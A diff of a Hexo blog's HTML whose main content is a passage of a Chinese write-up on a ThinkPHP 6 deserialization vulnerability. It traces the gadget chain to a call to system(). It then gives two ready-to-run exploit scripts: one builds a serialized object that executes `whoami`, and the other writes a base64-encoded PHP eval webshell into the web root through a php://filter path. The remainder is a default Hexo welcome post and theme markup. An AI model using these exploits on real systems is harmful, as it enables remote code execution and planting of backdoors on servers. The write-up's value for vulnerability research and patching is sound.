class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回到 <code>save()</code> 方法，继续观察后续代码。发现 <code>$this-&gt;store</code> 可以控制，即我们调用任意类的 set 方法，或者触发任意不存在 save 方法类的 <code>__call</code> 魔术方法。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;store-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;key, <span class="variable">$contents</span>, <span class="variable">$this</span>-&gt;expire);</span><br></pre></td></tr></table></figure>
+
+<p>找到<code>/vendor/topthink/framework/src/think/cache/driver/File.php</code></p>
+<h3 id="跟进-set-方法"><a href="#跟进-set-方法" class="headerlink" title="跟进 set 方法"></a>跟进 set 方法</h3><p><code>getExpireTime()</code> 方法为获取过期时间。<br><code>getCacheKey()</code> 方法为获取文件存储名字。</p>
+<h3 id="跟进serialize-方法"><a href="#跟进serialize-方法" class="headerlink" title="跟进serialize()方法"></a>跟进serialize()方法</h3><p>发现可利用点，<code>$serialize($data)</code>。其中 <code>$serialize</code> 由 <code>$this-&gt;options[&#39;serialize&#39;][0]</code> 控制，<code>$this-&gt;options[&#39;serialize&#39;][0]</code> 可控。<code>$data</code> 的来源为 $<code>contents = $this-&gt;getForStorage() --&gt; set($this-&gt;key, $contents, $this-&gt;expire) --&gt; set($name, $value, $expire = null) --&gt; serialize($value) --&gt; $serialize($data)</code> ，即 <code>$data</code> 源于<code>$this-&gt;getForStorage()</code>。上面已经跟进过 <code>getForStorage()</code> 方法，<code>getForStorage()</code> 方法中的<code>$cleaned</code> 、<code>$this-&gt;complete</code> 均可控，所以返回结果即可以控制。</p>
+<p><strong>serialize():</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span>(<span class="params"><span class="variable">$data</span></span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$data</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">string</span>) <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$serialize</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] ?? <span class="string">&quot;serialize&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$serialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>()</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="variable language_">$this</span>-&gt;complete = <span class="string">&quot;`whoami`&quot;</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>调用过程如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__destruct</span>()——&gt;<span class="title function_ invoke__">save</span>()——&gt;\think\cache<span class="title class_">\Driver\File</span>::<span class="title function_ invoke__">set</span>()——&gt;<span class="title function_ invoke__">serialize</span>()--&gt;<span class="variable">$serialize</span>(<span class="variable">$data</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-EXP"><a href="#0x05-EXP" class="headerlink" title="0x05-EXP"></a>0x05-EXP</h2><h3 id="EXP-1："><a href="#EXP-1：" class="headerlink" title="EXP_1："></a>EXP_1：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=[<span class="string">&quot;`whoami`&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>][<span class="number">0</span>] = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="EXP-2（文件写入操作，与上面大同小异，不做论述）："><a href="#EXP-2（文件写入操作，与上面大同小异，不做论述）：" class="headerlink" title="EXP_2（文件写入操作，与上面大同小异，不做论述）："></a>EXP_2（文件写入操作，与上面大同小异，不做论述）：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">filesystem</span>&#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">Psr</span>\<span class="title class_">SimpleCache</span>\<span class="title class_">CacheInterface</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">CacheStore</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$store</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$complete</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$key</span>;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$expire</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;autosave = <span class="literal">false</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;key = <span class="string">&quot;shell&quot;</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;store = <span class="keyword">new</span> \think\cache\Driver\<span class="title function_ invoke__">File</span>();</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;expire = <span class="number">1</span>;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;complete=<span class="string">&quot;aaaaPD9waHAgZXZhbCgkR0VUWyJjbWQiXSk7Pz4=&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">CacheStore</span>();</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span> &#123;</span><br><span class="line"> <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">Driver</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">File</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line"> <span class="keyword">protected</span> <span class="variable">$options</span> = [</span><br><span class="line"> <span class="string">&#x27;expire&#x27;</span> =&gt; <span class="number">0</span>,</span><br><span class="line"> <span class="string">&#x27;cache_subdir&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=/var/www/html/thinkphp6.0-dev/public/&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;hash_type&#x27;</span> =&gt; <span class="string">&#x27;md5&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line"> <span class="string">&#x27;tag_prefix&#x27;</span> =&gt; <span class="string">&#x27;tag:&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;serialize&#x27;</span> =&gt; [],</span><br><span class="line"> ];</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;serialize&#x27;</span>] = [];</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/naiyouhzu/topics/1541898">https://www.dazhuanlan.com/naiyouhzu/topics/1541898</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/18/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="singsing">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="singsing's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/18/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-03-18 00:41:04" itemprop="dateCreated datePublished" datetime="2022-03-18T00:41:04+08:00">2022-03-18</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">singsing</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">4</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
 </div>
 
-    <div id="primary">
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
         
-<div class="post">
-    <a href="/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/" title="暴力破解之前端AES加密">
-        <img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220318122718.png" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>三月 18, 2022</p>
-        <h3><a href="/2022/03/18/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E4%B9%8B%E5%89%8D%E7%AB%AFAES%E5%8A%A0%E5%AF%86/" title="暴力破解之前端AES加密" class="posttitle">暴力破解之前端AES加密</a></h3>
-        <p>0x01-前言某次测试中遇到一个信息泄露漏洞。页面提供一个查询功能，用户需要填写两个或三个参数值，且参数值正确才能返回相关信息。在测试中，发现仅需提供一个...</p>
-    </div>
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">singsing</span>
 </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
 
 
-<div class="post">
-    <a href="/2022/03/18/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/" title="ThinkPHP反序列化漏洞&#x2d;1">
-        <img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage16286677451.png" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>三月 18, 2022</p>
-        <h3><a href="/2022/03/18/ThinkPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1/" title="ThinkPHP反序列化漏洞&amp;#x2d;1" class="posttitle">ThinkPHP反序列化漏洞&amp;#x2d;1</a></h3>
-        <p>0x01-搭建环境详见前文
-0x02-利用条件详见前文
-0x03-知识要点官方文档介绍 ThinkPHP 6.* 启动方式是在终端输入 php think...</p>
-    </div>
-</div>
 
 
-<div class="post">
-    <a href="/2022/03/18/hello-world/" title="Hello World">
-        <img src="/img/cover.jpg" class="cover" width="680" height="440">
-    </a>
-    <div class="else">
-        <p>三月 18, 2022</p>
-        <h3><a href="/2022/03/18/hello-world/" title="Hello World" class="posttitle">Hello World</a></h3>
-        <p>Welcome to Hexo! This is your very first post. Check documentation for more i...</p>
-    </div>
-</div>
 
 
-    </div>
-    
-</div>
-<div id="preview"></div>
 
 
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
 
 </body>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
-        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
-        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
-        messageStyle: "none"
-    });
-</script>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-
-
 </html>
